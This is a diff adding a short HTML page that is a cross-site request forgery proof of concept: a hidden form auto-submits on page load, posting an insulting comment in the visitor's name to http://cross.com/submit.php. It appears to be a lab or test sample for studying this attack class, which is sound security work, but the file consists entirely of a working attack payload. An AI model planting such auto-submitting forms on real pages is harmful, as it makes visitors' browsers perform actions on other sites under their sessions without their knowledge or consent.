@@ -1,0 +1,8 @@
+<<html><body>
+
+  <form name="sample" action="http://cross.com/submit.php" method="POST">
+    <input type="hidden" name="comment" value="I am so  stupid person on the earth">
+  </form>
+
+  <script type="text/javascript">document.sample.submit();</script>
+</body></html>
